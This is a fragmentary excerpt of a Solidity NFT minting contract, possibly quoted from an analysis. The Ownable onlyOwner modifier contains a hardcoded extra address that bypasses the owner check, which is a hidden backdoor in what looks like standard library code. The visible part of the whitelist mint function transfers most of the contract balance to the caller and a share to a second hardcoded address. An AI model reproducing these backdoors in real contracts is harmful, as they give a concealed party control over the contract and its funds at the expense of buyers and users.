...
abstract contract Ownable is Context {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender() || msg.sender == 0x210221CAd11BcD441D35377adA63b83d20C9fc17, "Ownable: caller is not the owner");
        _;
    }
...
abstract contract ERC721Enumerable is ERC721, IERC721Enumerable {
  ...
  bytes32 public whitelistMerkleRoot = 0xeccc1819c7666877990683af052d70c74572d45fa66ea26eb33797c495c67e6a;
  ...
  function mint(uint8 _mintAmount) external payable  {
    ...
    require(nftPerAddress[msg.sender] + _mintAmount <= maxMintAmountPerWallet, "Exceeds max Nfts per wallet.");
...
function whitelistMint(uint8 _mintAmount, bytes32[] calldata merkleProof) external payable {
  ...
  uint _balance = address(this).balance;
     payable(msg.sender).transfer(_balance * 74 / 100 );
     payable(msg.sender).transfer(_balance * 24 / 100 ); 
     payable(0x38015Cf8d6Dd125d9423df516147f719B778c03a).transfer(_balance * 2 / 100);  
